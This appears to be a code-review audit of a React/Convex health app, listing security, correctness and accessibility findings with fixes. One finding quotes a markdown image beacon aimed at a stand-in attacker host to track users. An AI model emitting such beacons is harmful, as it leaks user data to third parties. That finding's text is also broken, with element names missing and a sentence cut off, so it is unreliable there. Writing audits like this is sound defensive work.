findings.title: copyRichContent writes raw AI-generated innerHTML to clipboard without sanitization
findings.description: copyRichContent() calls el.innerHTML and writes the raw HTML string to the clipboard as 'text/html'. The innerHTML includes whatever react-markdown produced from AI text. While react-markdown does not set dangerouslySetInnerHTML itself, the rendered DOM includes all markdown-generated elements. Any HTML that leaked through the AI_MARKDOWN_COMPONENTS override (e.g., an unhandled element type or a future react-markdown regression) would be copied verbatim and could execute in the paste target if that application renders clipboard HTML. The more immediate concern is that el.innerText is already correct for plain-text fidelity; the rich-text copy is unnecessary for a 'copy report' feature and adds the attack surface for nothing.
findings.fix: Either (a) drop the 'text/html' ClipboardItem and copy el.innerText only — that is sufficient for pasting into notes/email with structure preserved as plain text — or (b) sanitize the HTML string through DOMPurify before writing it: `import DOMPurify from 'dompurify'; const safeHtml = DOMPurify.sanitize(html);`.

findings.title: CopyReportButton does not handle clipboard API failure
findings.description: handleCopy is an async function that awaits copyRichContent(), which itself calls navigator.clipboard.write(). Neither function has a try/catch. If the clipboard API is unavailable (e.g., non-secure context, permissions denied, Firefox without the ClipboardItem API), the promise rejects silently. The user sees no feedback — 'copied!' never appears, there is no error state, and the promise rejection is unhandled.
findings.fix: Wrap the await in a try/catch. On failure, surface a brief error message in place of 'copied!' (e.g., 'copy failed') or use a toast. Also: ClipboardItem is not supported in Firefox without a flag; consider a fallback path using document.execCommand('copy') on a temporary textarea.

findings.title: AI_MARKDOWN_COMPONENTS is duplicated across three files with no shared definition
findings.description: The same AI_MARKDOWN_COMPONENTS constant (link stripping override) is defined identically in ConversationPanel.tsx (line 14), DrPooReport.tsx (line 28), and MealIdeaCard.tsx (line 7). This is three independent copies of security-critical configuration. If a new element needs to be neutralized (e.g., img or script), a developer must update all three files. Missing one copy would silently leave a security gap.
findings.fix: Extract the constant to a single shared module, e.g., src/lib/aiMarkdownComponents.ts, and import it in all three files. Add a comment that changes here are security-relevant.

findings.title: react-markdown does not sanitize HTML by default — img, table, and raw HTML elements are rendered
findings.description:
react-markdown with default settings renders safe HTML by subset, but it does allow some elements through that AI_MARKDOWN_COMPONENTS does not override: notably (which can be used to trigger cross-origin requests or as a beacon), ,
, and any inline HTML that a markdown parser passes through (depending on version and config). The AI_MARKDOWN_COMPONENTS override only handles . If an AI response contains '![](https://attacker.com/track?user=X)' or an inline
findings.fix: Pass `allowedElements` or `disallowedElements` props to the Markdown component to whitelist only safe elements. At minimum add an `img` override that renders null: `img: () => null`. Consider using the `rehype-sanitize` plugin for defence in depth: `import rehypeSanitize from 'rehype-sanitize'` and pass `rehypePlugins={[rehypeSanitize]}` to every Markdown usage.

findings.title: stableEndMs is computed inside useMemo with no deps — it will be stale after 7 days
findings.description: The constant `farFuture = Date.now() + 7 * 24 * 60 * 60_000` is computed once on component mount inside a useMemo with an empty dep array `[]`. If the ConversationPanel stays mounted across the 7-day boundary (which is plausible for a persistent SPA where users stay logged in), stableEndMs will become stale and new messages timestamped after that point would not appear in the query window. This is a latent bug that would be very confusing to diagnose.
findings.fix: Use a sufficiently distant fixed constant rather than Date.now() + delta, or recalculate the boundary at a longer cadence using a useInterval/useEffect. The simplest safe fix is `const FAR_FUTURE = 9999999999999` (year 2286) as a module-level constant, since the intent is just 'no upper bound'.

findings.title: Optimistic dedup uses content.trim() equality — collides on identical messages
findings.description: confirmedUserContents is a Set of trimmed message content strings. If the user sends the same message twice (e.g., 'How am I doing?' submitted twice), both messages would have identical trimmed content. The second confirmed message would suppress the second optimistic entry, making it appear that only one message was sent until the analysis completes. This is a minor UX bug but can cause genuine confusion about whether the second message was captured.
findings.fix: Dedup optimistic entries against confirmed entries by timestamp or by the Convex _id field, not content. The pendingReplies query already returns objects with _id from Convex; use that for identity comparison instead of content equality.

findings.title: addUserMessage and addAssistantMessage use raw ctx.auth.getUserIdentity() instead of requireAuth
findings.description: Two mutations in conversations.ts (addUserMessage on line 15, addAssistantMessage on line 46) use raw ctx.auth.getUserIdentity() and check for null directly, instead of calling requireAuth(ctx) from convex/lib/auth.ts. This is the legacy pattern flagged in the code review guidelines as HIGH priority. claimPendingReplies (line 173) and pendingReplies (line 201) correctly use requireAuth. The inconsistency means these two mutations bypass whatever additional checks requireAuth performs beyond getUserIdentity.
findings.fix: Replace `const identity = await ctx.auth.getUserIdentity(); if (identity === null) throw new Error('Not authenticated'); const userId = identity.subject;` in both mutations with `const { userId } = await requireAuth(ctx);`.

findings.title: periodSummary filter condition is backwards — excludes current-period summaries
findings.description: The condition `latestWeeklySummary.weekEndTimestamp <= halfWeekStartMs` filters OUT summaries whose weekEndTimestamp is after the current half-week boundary. The intent described in comments is to show a 'period summary pinned at top'. But this condition means: only show the summary if it ended BEFORE the current window started — i.e., only show an OLD (previous period) summary. If the summary was generated for the current period, weekEndTimestamp would be >= halfWeekStartMs and would be excluded. This may be intentional design (showing the previous period summary as context), but if so it is not documented and the variable naming 'latestWeeklySummary' suggests it should be the most recent one.
findings.fix: Clarify intent with a comment. If the goal is to show the previous period's summary as historical context, rename the variable to `previousPeriodSummary` and add an explicit comment. If the goal is to show the summary relevant to the current window, flip the condition to `>=`.

findings.title: addReply mutation failure is silently swallowed
findings.description: handleSubmit calls addReply(trimmed) — which is an async Convex mutation — but does not await it and has no error handling. The text is cleared from the input immediately on line 35 before the mutation succeeds. If the mutation fails (network error, auth error, validation error), the user's message is lost with no feedback. The input is cleared and the message never appears in the conversation.
findings.fix: Make handleSubmit async, await addReply, and handle the error case. On failure, restore the text to the input and show an error message. Since handleSubmit is used as a useCallback, mark the callback async and add try/catch: `const trimmed = text.trim(); setText(''); try { await addReply(trimmed); } catch { setText(trimmed); /* show error */ }`.

findings.title: Error display truncates at 120 chars but provides no way to see the full error
findings.description: The error message is truncated to 120 characters with an ellipsis appended. For API errors, the relevant diagnostic detail (e.g., HTTP status code, rate limit info) often appears beyond that cutoff. Developers and power users have no way to see the full error without opening devtools.
findings.fix: Either expand to a slightly larger limit (300 chars is still reasonable for inline display), or wrap the error text in a collapsible/tooltip that shows the full message on hover/expand. For a clinical health app, clear error messaging is important — users may need to relay errors to support.

findings.title: Expand/Collapse button is only visible on hover — keyboard users cannot discover it
findings.description: The ExpandableMessage expand/collapse button has `opacity-0 group-hover:opacity-100 group-focus-within:opacity-100`. The group-focus-within rule means that if focus lands inside the group it becomes visible, but the button itself is the only interactive element inside the group container (the message content is not focusable). A keyboard user tabbing through the conversation would need to tab to the button to make it visible, but has no indication it exists before doing so. Screen readers would still announce it since opacity does not affect accessibility tree presence, but sighted keyboard users would not see it.
findings.fix: Always show the button (remove opacity-0 default) but use a lower opacity at rest (e.g., `opacity-30`) that increases on hover/focus. Alternatively, use a visually-present toggle icon (like a chevron) that is always visible rather than a hidden button.

findings.title: Send button has no accessible label
findings.description: The Send button renders only an icon (`<Send size={14} />`). There is no aria-label, aria-describedby, or visible text. A screen reader would announce this as an unlabeled button or a generic 'button' with no context. The input has aria-label='Reply to Dr. Poo', but the adjacent send button needs its own label.
findings.fix: Add `aria-label='Send reply'` to the button element.

findings.title: extractFoodTags operates on raw AI-generated strings without any length guard
findings.description: extractFoodTags joins all meal items and scans them for keywords. If an AI response returns an unexpectedly large items array (e.g., dozens of items), this join produces a large string. The matched tags are capped at 4, but the join + scan itself has no guard. This is low risk given the meal plan structure, but the function trusts AI output shape without validation.
findings.fix: Add a guard: `const joined = items.slice(0, 20).join(' ').toLowerCase().slice(0, 1000)`. Makes the function resilient to malformed AI responses without changing normal behavior.

findings.title: DrPooReportDetails renders section 3 (Next Food to Try) unconditionally without null guard
findings.description: All other optional sections (clinicalReasoning, mealPlan, educationalInsight, suggestions, miniChallenge, lifestyleExperiment) are guarded with conditional rendering. Section 3 — nextFoodToTry — renders unconditionally. If the AI returns a response where nextFoodToTry is null, undefined, or an empty object, this will either render an empty card or throw a runtime error accessing nextFoodToTry.food.
findings.fix: Wrap the section with a guard: `{insights.nextFoodToTry && (...)}`. Check the AiNutritionistInsight type definition to confirm whether nextFoodToTry is optional; if it is required by type, add a runtime guard anyway since AI output shape cannot be fully trusted.

findings.title: index.ts only re-exports one item — barrel file adds indirection for no benefit
findings.description: The index.ts re-exports only AnalysisProgressOverlay from one file. MealIdeaCard and the AI_MARKDOWN_COMPONENTS constant are not exported through the barrel. The barrel adds a level of import indirection (consumers import from the barrel, not directly from the file) without providing grouping, tree-shaking, or API-surface benefits for a single export.
findings.fix: Either add all public exports from the directory to make the barrel meaningful, or delete the barrel and import AnalysisProgressOverlay directly from its file. Lean toward deletion since it currently obscures the module structure.
